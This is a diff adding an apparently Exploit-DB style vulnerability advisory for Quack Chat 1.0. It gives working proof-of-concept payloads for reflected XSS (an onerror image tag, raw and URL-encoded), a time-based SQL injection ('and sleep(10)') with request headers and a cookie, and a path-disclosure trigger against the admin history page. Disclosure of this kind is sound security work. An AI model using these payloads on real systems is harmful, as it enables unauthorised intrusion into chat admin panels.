@@ -1,0 +1,61 @@
+###########################################################################################
+# Exploit Title: Quack Chat 1.0 - XSS / SQL Injection / Path Diclosure
+# Date: 15 de Agosto del 2013
+# Exploit Author: Dylan Irzi
+# Credit goes for: websecuritydev.com
+# Vendor Homepage: http://www.quack-chat.com/
+# Tested on: Win8 & Linux Mint
+# Affected Version : 1.0
+# Contacts: { https://twitter.com/Dylan_irzi11 , http://websecuritydev.com/}
+# Greetz: All team WebSecuritydev.
+###########################################################################################
+
+Cross Site Scripting:
+Archivos Afectados Afectados
+
+qchat.php
+qc_admin/index.php?p=history
+
+PoC:
+localhost/qchat.php
+Vector: ""><img src=x onerror=prompt(/XSS/);>>
+
+Input:
+<input id="name" type="text" style="width:200px;" name="name">
+Is Reflected: localhost/qc_admin/index.php?p=history
+
+PoC #2:
+localhost/qc_admin/index.php?p=history&page=2+(XSS Vector)
+Example:
+localhost/qc_admin/index.php?p=history&page=2%22%22%3E%3Cimg%20src=x%20onerror=prompt%28/XSS/%29;%3E%3E
+
+-------------------------------------------------------------------
+SQL Injection
+
+localhost/qc_admin/index.php?p=history&id=(SQL Injection)
+localhost/qc_admin/index.php?p=history&page=(SQL Injection)
+
+# Exploit-DB note: Here's a PoC:
+# <server>/qc_admin/index.php?p=history&id=1 and sleep(10)
+
+Accept: */*
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET
+CLR 2.0.50727)
+Cookie: PHPSESSID=7d87f318548027737ae3893189e2ff0e
+
+(Remplazar por una Session Cookie Valida)
+
+-------------------------------------------------------------------
+Path Diclosure
+
+localhost/qc_admin/index.php?p=history&id='
+
+in /var/www/chat/qc_admin/index.php on line 249
+
+--------------------------------------------------------------------
+
+*By Dylan Irzi
+@Dylan_Irzi11
+Pentest de Seguridad.
+
+*
